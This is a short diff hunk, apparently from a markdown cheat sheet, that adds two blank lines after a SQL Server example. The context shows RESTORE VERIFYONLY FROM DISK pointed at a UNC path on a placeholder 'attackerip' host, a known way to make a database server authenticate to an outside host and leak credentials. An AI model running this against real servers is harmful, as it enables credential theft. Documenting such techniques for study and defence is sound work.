@@ -56,3 +56,5 @@ RESTORE VERIFYONLY FROM DISK = '\\attackerip\file'
 
 This command verifies the backup file from the specified file path on the remote server.
 ```
+
+
